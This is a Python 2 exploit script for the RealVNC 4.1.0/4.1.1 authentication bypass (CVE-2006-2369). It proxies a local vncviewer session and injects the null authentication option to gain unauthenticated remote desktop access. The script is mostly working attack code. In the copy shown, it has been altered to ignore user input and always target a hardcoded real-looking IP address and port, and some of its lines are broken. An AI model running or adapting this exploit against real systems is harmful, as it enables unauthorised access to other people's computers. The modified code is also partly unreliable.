# Exploit Title: RealVNC 4.1.0 and 4.1.1 Authentication Bypass Exploit
# Date: 2012-05-13
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 4.1.0 and 4.1.1
# Tested on: Windows XP
# CVE: CVE-2006-2369 
# Requires vncviewer installed
# Basic port of hdmoore/msf2 perl version to python for fun and profit (ease of use)
import select
import thread
import os
import socket
import sys, re

BIND_ADDR = '127.0.0.1'
BIND_PORT = 5900

def vncdeneme(host, port):
        client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        client.send("data")
        response=client.recv(4096)
        print ("I am just coming from the " + response + """
It is OK !""")
def pwn4ge(host, port):
	socket.setdefaulttimeout(60)
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	vncdeneme("213.141.156.24", int("5922"))

	try:
                
		server.connect(("213.141.156.24", int(5922)))
	except socket.error, msg:
		print '[*] Could not connect to the target VNC service. Error code: ' + int(msg[0]) + ' , Error message : ' + msg[1] 
		sys.exit();
	else:
		hello = server.recv(12)
		print "[*] Hello From Server: " + hello
		if hello != "RFB 003.008\n":
			print "[*] The remote VNC service is not vulnerable"
			sys.exit()
		else:
			print "[*] The remote VNC service is vulnerable"
			listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				listener.bind((BIND_ADDR, BIND_PORT))
			except socket.error , msg:
				print '[*] Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
				sys.exit()
			print "[*] Listener Socket Bind Complete"
			listener.listen(10)
			print "[*] Launching local vncviewer"
			thread.start_new_thread(os.system,('vncviewer ' + BIND_ADDR + '::' + str(BIND_PORT),))
			print "[*] Listener waiting for VNC connections on localhost"
			client, caddr = listener.accept()
			listener.close()
			client.send(hello)
			chello = client.recv(12)
			server.send(chello)
			methods = server.recv(2)
			print "[*] Auth Methods Recieved. Sending Null Authentication Option to Client"
			client.send("\x01\x01")
			client.recv(1)
			server.send("\x01")
			server.recv(4)
			client.send("\x00\x00\x00\x00")
			print "[*] Proxying data between the connections..."
			running = True
			while running:
				selected = select.select([client, server], [], [])[0]
				if client in selected:
					buf = client.recv(8192)
					if len(buf) == 0:
						running = False
					server.send(buf)
				if server in selected and running:
					buf = server.recv(8192)
					if len(buf) == 0:
						running = False
					client.send(buf)
				pass
			client.close()
		server.close()
	sys.exit()

def printUsage():
        print "[*] Read the source, Luke!"

def main():
	try:
		SERV_ADDR = sys.argv[1]
		SERV_PORT = sys.argv[2]
	except:
		SERV_ADDR = raw_input("[*]IP address: ")
		SERV_PORT = 5922
	try:
		socket.inet_aton(SERV_ADDR)
	except socket.error:
		printUsage()
	else:
		pwn4ge("213.141.156.24", int("5922"))

if __name__ == "__main__":
	main()
